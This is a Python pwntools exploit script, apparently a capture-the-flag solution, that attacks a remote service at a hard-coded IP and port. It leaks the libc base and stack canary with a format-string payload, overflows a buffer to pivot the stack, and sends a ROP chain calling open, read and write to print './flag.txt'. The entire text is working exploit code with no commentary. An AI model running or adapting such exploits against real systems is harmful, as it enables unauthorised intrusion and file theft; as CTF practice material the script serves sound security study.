from pwn import *
conn = remote('101.200.155.151', 12500)
binary = ELF('./attachment-42')
shared_lib = ELF('./libc.so.6')
context(arch='amd64', log_level='debug', os='linux')
gadget_1 = 0x000000000040119a  
gadget_2 = 0x000000000040119c  
buffer_section = 0x404000 + 0x900  
conn.recvuntil("where are you go?\n")
conn.sendline("1")
conn.recvuntil("Enter you password:\n")
leak_payload = b'%39$p%11$p'
conn.sendline(leak_payload)
conn.recvuntil("0x")
leaked_value = int(conn.recv(12), 16) - 128
shared_lib_base = leaked_value - shared_lib.sym['__libc_start_main']
conn.recvuntil("0x")
stack_protector = int(conn.recv(16), 16)
conn.recvuntil("I will check your password:")
conn.send("a" * 8)
conn.recvuntil("where are you go?\n")
conn.sendline("2")
conn.recvuntil("We have a lot to talk about\n")
bypass_payload = b'a' * 0x28 + p64(stack_protector) + p64(buffer_section + 0x30) + p64(0x4011C9)
conn.send(bypass_payload)
conn.recvuntil("a" * 0x28)
gadget_3 = 0x000000000011f2e7 + shared_lib_base  
func_open = shared_lib_base + shared_lib.sym['open']
func_read = shared_lib_base + shared_lib.sym['read']
func_write = shared_lib_base + shared_lib.sym['write']
final_payload = b'./flag.txt'.ljust(0x28, b'\x00') + p64(stack_protector) + p64(0) + p64(gadget_1) + p64(buffer_section) + p64(gadget_2) + p64(0) + p64(0) + p64(func_open)
final_payload += p64(gadget_1) + p64(3) + p64(gadget_2) + p64(buffer_section + 0x200) + p64(0) + p64(gadget_3) + p64(0x50) + p64(0) + p64(func_read)
final_payload += p64(gadget_1) + p64(1) + p64(gadget_2) + p64(buffer_section + 0x200) + p64(0) + p64(gadget_3) + p64(0x50) + p64(0) + p64(func_write)
print(hex(len(final_payload)))
conn.send(final_payload)
conn.interactive()